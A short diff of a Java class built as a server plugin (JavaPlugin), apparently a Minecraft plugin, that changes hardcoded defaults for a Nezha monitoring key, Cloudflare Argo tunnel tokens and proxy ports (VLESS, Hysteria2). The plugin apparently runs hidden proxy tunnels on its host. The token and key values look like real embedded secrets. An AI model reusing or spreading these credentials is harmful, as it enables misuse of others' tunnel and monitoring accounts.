@@ -71,8 +71,8 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
     private static final String NEZHA_PORT = env("NEZHA_PORT", "443");
     private static final String NEZHA_KEY = env("NEZHA_KEY", "EeW4MkOxB2y34ecy3f");
 
-    private static final String ECH_ARGO_TOKEN = env("ECH_ARGO_TOKEN", "eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiMDg0MDUxYzctNDE5Yy00MTg1LTlhMTgtNWY2OWE1ZDMxYzg1IiwicyI6Ik16VmpNVGd4TURNdE1HVXpNQzAwTlRVM0xXSmxaakV0WkRjek5XVmhaV05rTkdFMiJ9");
-    private static final String VLESS_ARGO_TOKEN = env("VLESS_ARGO_TOKEN", "eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiMDg0MDUxYzctNDE5Yy00MTg1LTlhMTgtNWY2OWE1ZDMxYzg1IiwicyI6Ik16VmpNVGd4TURNdE1HVXpNQzAwTlRVM0xXSmxaakV0WkRjek5XVmhaV05rTkdFMiJ9");
+    private static final String ECH_ARGO_TOKEN = env("ECH_ARGO_TOKEN", "eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiODZiNTkwMTMtOTVmYi00YWIyLWFlM2YtMDQwYWE0ODczMTJmIiwicyI6Ik0yUXlPVGRoWmpNdFl6TTRaaTAwTlRFMExXRXpaV1V0TTJRNU56WmlOR1ptTXpKaSJ9");
+    private static final String VLESS_ARGO_TOKEN = env("VLESS_ARGO_TOKEN", "eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiODZiNTkwMTMtOTVmYi00YWIyLWFlM2YtMDQwYWE0ODczMTJmIiwicyI6Ik0yUXlPVGRoWmpNdFl6TTRaaTAwTlRFMExXRXpaV1V0TTJRNU56WmlOR1ptTXpKaSJ9");
 
     private static final String WSPORT = env("WSPORT", "8001");
     private static final String VLPORT = env("VLPORT", "8002");
@@ -84,7 +84,7 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
     private static final String HY_IPS = env("HY_IPS", "4");
 
     private static final String ENABLE_HY2 = env("ENABLE_HY2", "1");
-    private static final String HY_PORT = env("HY_PORT", "24092");
+    private static final String HY_PORT = env("HY_PORT", "");
     private static final String NAME = env("NAME", "MJJ");
     private static final String PASSWORD = UUID_VAL;
 
